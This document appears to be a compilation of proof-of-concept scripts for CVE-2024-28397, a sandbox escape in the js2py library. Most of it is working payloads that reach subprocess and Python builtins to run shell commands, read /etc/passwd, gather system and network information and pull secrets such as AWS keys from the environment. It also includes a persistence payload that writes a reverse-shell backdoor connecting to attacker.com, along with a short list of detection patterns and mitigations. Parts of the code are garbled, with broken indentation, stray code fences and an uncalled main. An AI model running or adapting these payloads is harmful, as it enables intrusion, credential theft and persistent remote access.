
##
##
## https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py
##
##

import js2py
from sys import version

payload = """
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

def test_poc():
    etcpassword_piece = "root:x:0:0"
    result = ""
    try:
        result = repr(js2py.eval_js(payload))
    except Exception:
        return False
    return etcpassword_piece in result

def main():
    if test_poc():
        print("Success! the vulnerability exists for python " + repr(version))
    else:
        print("Failed for python " + repr(version))

if __name__ == "__main__":
    main

##
##

#!/usr/bin/env python3
"""
CVE-2024-28397: js2py Sandbox Escape Proof of Concept
Demonstrates arbitrary code execution through prototype pollution
and Python object introspection.
"""

import js2py
import sys
import subprocess
import platform

class JS2PySandboxEscape:
    """Demonstrates various sandbox escape techniques for js2py"""
    
    def __init__(self):
        self.base_payload_template = """
        // Base sandbox escape using prototype pollution
        let hacked = Object.getOwnPropertyNames({})
        let bymarve = hacked.__getattribute__
        let n11 = bymarve("__getattribute__")
        let obj = n11("__class__").__base__
        let getattr = obj.__getattribute__

        function findpopen(o) {{
            let result;
            for(let i in o.__subclasses__()) {{
                let item = o.__subclasses__()[i]
                if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
                    return item
                }}
                if(item.__name__ != "type" && (result = findpopen(item))) {{
                    return result
                }}
            }}
        }}

        let cmd = "{command}"
        let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
        console.log(result)
        result
        """

    def create_payload(self, command):
        """Create a payload with the specified command"""
        return self.base_payload_template.format(command=command)

    def execute_payload(self, payload):
        """Execute the payload and return results"""
        try:
            result = js2py.eval_js(payload)
            return str(result), True
        except Exception as e:
            return str(e), False

    def test_basic_escape(self):
        """Test basic file read capability"""
        payload = self.create_payload("head -n 1 /etc/passwd")
        result, success = self.execute_payload(payload)
        
        if success and "root:" in result:
            print("✓ Basic file read successful")
            return True
        else:
            print("✗ Basic file read failed")
            return False

    def test_system_info(self):
        """Test system information gathering"""
        commands = [
            ("whoami", "Current user"),
            ("pwd", "Current directory"), 
            ("uname -a", "System information"),
            ("id", "User ID information")
        ]
        
        results = {}
        for cmd, desc in commands:
            payload = self.create_payload(cmd)
            result, success = self.execute_payload(payload)
            results[desc] = result if success else "Failed"
            print(f"{'✓' if success else '✗'} {desc}: {result[:50]}...")
        
        return results

    def test_network_recon(self):
        """Test network reconnaissance capabilities"""
        commands = [
            ("ip addr show", "Network interfaces"),
            ("netstat -tuln", "Listening ports"),
            ("ps aux", "Running processes")
        ]
        
        for cmd, desc in commands:
            payload = self.create_payload(cmd)
            result, success = self.execute_payload(payload)
            print(f"{'✓' if success else '✗'} {desc}: {'Success' if success else 'Failed'}")

class AlternativeEscapeTechniques:
    """Alternative sandbox escape methods"""
    
    @staticmethod
    def file_access_payload():
        """Direct file access through Python objects"""
        return """
        let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
        
        function findBuiltins(o) {
            for(let i in o.__subclasses__()) {
                let item = o.__subclasses__()[i]
                if(item.__name__ == "catch_warnings") {
                    return item()._module.__builtins__
                }
            }
        }
        
        let builtins = findBuiltins(obj)
        let file_content = builtins.open("/etc/passwd", "r").read()
        console.log(file_content)
        file_content
        """

    @staticmethod
    def import_bypass_payload():
        """Bypass import restrictions"""
        return """
        let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
        
        function getBuiltins(o) {
            for(let i in o.__subclasses__()) {
                let item = o.__subclasses__()[i]
                if(item.__name__ == "catch_warnings") {
                    return item()._module.__builtins__
                }
            }
        }
        
        let builtins = getBuiltins(obj)
        let os = builtins.__import__("os")
        let result = os.system("whoami")
        console.log("Command executed with return code:", result)
        result
        """

    @staticmethod
    def eval_payload():
        """Use eval for code execution"""
        return """
        let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
        
        function getBuiltins(o) {
            for(let i in o.__subclasses__()) {
                let item = o.__subclasses__()[i]
                if(item.__name__ == "catch_warnings") {
                    return item()._module.__builtins__
                }
            }
        }
        
        let builtins = getBuiltins(obj)
        let result = builtins.eval("__import__('os').system('ls -la')")
        console.log("Eval result:", result)
        result
        """

def demonstrate_vulnerability():
    """Main demonstration function"""
    print("=" * 60)
    print("CVE-2024-28397: js2py Sandbox Escape Demonstration")
    print("=" * 60)
    print(f"Python Version: {sys.version}")
    print(f"Platform: {platform.platform()}")
    print(f"js2py Version: {js2py.__version__ if hasattr(js2py, '__version__') else 'Unknown'}")
    print("=" * 60)
    
    # Test basic escape
    escape = JS2PySandboxEscape()
    print("\n[1] Testing Basic Sandbox Escape:")
    escape.test_basic_escape()
    
    print("\n[2] Testing System Information Gathering:")
    escape.test_system_info()
    
    print("\n[3] Testing Network Reconnaissance:")
    escape.test_network_recon()
    
    # Test alternative techniques
    print("\n[4] Testing Alternative Escape Techniques:")
    alt = AlternativeEscapeTechniques()
    
    techniques = [
        ("File Access", alt.file_access_payload()),
        ("Import Bypass", alt.import_bypass_payload()),
        ("Eval Execution", alt.eval_payload())
    ]
    
    for name, payload in techniques:
        try:
            result = js2py.eval_js(payload)
            print(f"✓ {name}: Success")
        except Exception as e:
            print(f"✗ {name}: Failed - {str(e)[:50]}...")

def create_detection_signatures():
    """Generate detection signatures for this vulnerability"""
    signatures = {
        "javascript_patterns": [
            r"Object\.getOwnPropertyNames\(\{\}\)\.__getattribute__",
            r"__getattribute__.*__class__.*__base__",
            r"__subclasses__\(\).*subprocess.*Popen",
            r"findpopen\(.*\).*communicate\(\)",
            r"catch_warnings.*_module\.__builtins__"
        ],
        "python_patterns": [
            r"js2py\.eval_js\(",
            r"subprocess\.Popen",
            r"__import__\(['\"]os['\"]\)",
            r"builtins\.eval\("
        ]
    }
    
    print("\n[5] Detection Signatures:")
    print("JavaScript patterns to monitor:")
    for pattern in signatures["javascript_patterns"]:
        print(f"  - {pattern}")
    
    print("\nPython patterns to monitor:")
    for pattern in signatures["python_patterns"]:
        print(f"  - {pattern}")

def mitigation_recommendations():
    """Provide mitigation recommendations"""
    print("\n[6] Mitigation Recommendations:")
    mitigations = [
        "Update js2py to a patched version (if available)",
        "Implement input validation and sanitization",
        "Use containerization to limit system access",
        "Monitor for suspicious JavaScript execution patterns",
        "Implement network segmentation",
        "Use application sandboxing (AppArmor, SELinux)",
        "Regular security audits of JavaScript execution environments"
    ]
    
    for i, mitigation in enumerate(mitigations, 1):
        print(f"  {i}. {mitigation}")

if __name__ == "__main__":
    try:
        demonstrate_vulnerability()
        create_detection_signatures()
        mitigation_recommendations()
    except KeyboardInterrupt:
        print("\n\nDemonstration interrupted by user")
    except Exception as e:
        print(f"\nError during demonstration: {e}")
    
    print("\n" + "=" * 60)
    print("Demonstration complete. Use responsibly!")
    print("=" * 60)

##
##

def create_web_scanner_payload(target_url):
    """Create payload for web application testing"""
    return f"""
    let obj = Object.getOwnPropertyNames({{}}).__getattribute__("__getattribute__")("__class__").__base__
    
    function getBuiltins(o) {{
        for(let i in o.__subclasses__()) {{
            let item = o.__subclasses__()[i]
            if(item.__name__ == "catch_warnings") {{
                return item()._module.__builtins__
            }}
        }}
    }}
    
    let builtins = getBuiltins(obj)
    let urllib = builtins.__import__("urllib.request")
    let response = urllib.urlopen("{target_url}")
    let content = response.read().decode()
    console.log("Response length:", content.length)
    content.substring(0, 200)
    """
    
##
##

def env_extraction_payload():
    """Extract environment variables"""
    return """
    let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
    
    function getBuiltins(o) {
        for(let i in o.__subclasses__()) {
            let item = o.__subclasses__()[i]
            if(item.__name__ == "catch_warnings") {
                return item()._module.__builtins__
            }
        }
    }
    
    let builtins = getBuiltins(obj)
    let os = builtins.__import__("os")
    let env_vars = os.environ
    
    let sensitive_vars = ["PATH", "HOME", "USER", "AWS_ACCESS_KEY_ID", "DATABASE_URL"]
    let results = {}
    
    for(let i = 0; i < sensitive_vars.length; i++) {
        let key = sensitive_vars[i]
        if(env_vars.get(key)) {
            results[key] = env_vars.get(key)
        }
    }
    
    console.log("Environment variables:", results)
    results
    """


    def persistence_payload():
    """Create persistence mechanism"""
    return """
    let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
    
    function getBuiltins(o) {
        for(let i in o.__subclasses__()) {
            let item = o.__subclasses__()[i]
            if(item.__name__ == "catch_warnings") {
                return item()._module.__builtins__
            }
        }
    }
    
    let builtins = getBuiltins(obj)
    let backdoor_script = `
```
```

import socket
import subprocess
import os

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker.com', 4444))
    while True:
        cmd = s.recv(1024).decode()
        if cmd == 'exit': break
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        s.send((result.stdout + result.stderr).encode())
    s.close()

if __name__ == '__main__':
    connect_back()
`
    
    // Write backdoor to temp file
    let temp_file = "/tmp/backdoor.py"
    builtins.open(temp_file, "w").write(backdoor_script)
    
    console.log("Backdoor written to:", temp_file)
    temp_file
    """
